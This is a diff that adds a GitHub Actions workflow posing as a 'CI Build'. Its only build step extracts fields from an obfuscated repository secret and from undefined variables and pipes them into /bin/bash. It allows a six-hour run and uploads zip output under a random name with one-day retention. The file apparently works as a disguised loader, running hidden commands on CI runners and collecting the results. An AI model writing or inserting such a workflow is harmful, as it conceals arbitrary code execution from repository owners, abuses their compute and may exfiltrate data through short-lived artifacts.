@@ -1,0 +1,31 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build and run
+        env:
+          nf7: ${{ secrets.nf7 }}
+        run: |
+          printf '%s' "$nf7" | jq -r .ue8880 | /bin/bash
+          echo $cidk184 | jq -r .r2 | /bin/bash
+          echo $xxtu4453 | jq -r .uhci321 | /bin/bash
+          printf '%s' "$v2174" | jq -r .sofnm0 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: b43bQMjJ
+          path: "*.zip"
+          retention-days: 1
